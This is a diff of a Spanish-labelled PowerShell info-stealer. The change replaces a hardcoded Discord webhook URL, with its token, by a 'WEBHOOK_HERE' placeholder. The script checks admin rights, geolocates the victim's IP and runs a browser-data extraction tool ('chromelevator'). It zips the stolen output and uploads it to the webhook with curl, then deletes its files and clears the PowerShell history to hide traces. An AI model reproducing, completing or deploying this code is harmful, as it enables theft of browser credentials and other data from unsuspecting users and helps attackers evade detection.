@@ -1,5 +1,5 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$webhook = 'https://discordapp.com/api/webhooks/1502593734502514722/W7fg9W5OKKH0gedYJV44ribRUIQJhMnlkiF4TZiHVct57zKo8Rz8Yf01zV3Q1WXxXSrt'
+$webhook = 'WEBHOOK_HERE'
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $privilegios = if ($isAdmin) { "ADMINISTRADOR (Acceso Total)" } else { "ESTANDAR (Acceso Limitado a WiFi)" }
 $geo = Invoke-RestMethod -Uri 'http://ip-api.com/json' -UseBasicParsing
@@ -44,7 +44,7 @@ Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force
 cd ext
 .\chromelevator_x64.exe all -f -o out
 Compress-Archive -Path "out\*" -DestinationPath "cosa.zip" -Force
-curl.exe -F "file=@cosa.zip" "https://discordapp.com/api/webhooks/1502593734502514722/W7fg9W5OKKH0gedYJV44ribRUIQJhMnlkiF4TZiHVct57zKo8Rz8Yf01zV3Q1WXxXSrt"
+curl.exe -F "file=@cosa.zip" "WEBHOOK_HERE"
 cd $env:TEMP; rm -Recurse -Force "$env:TEMP\work"
 Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-History
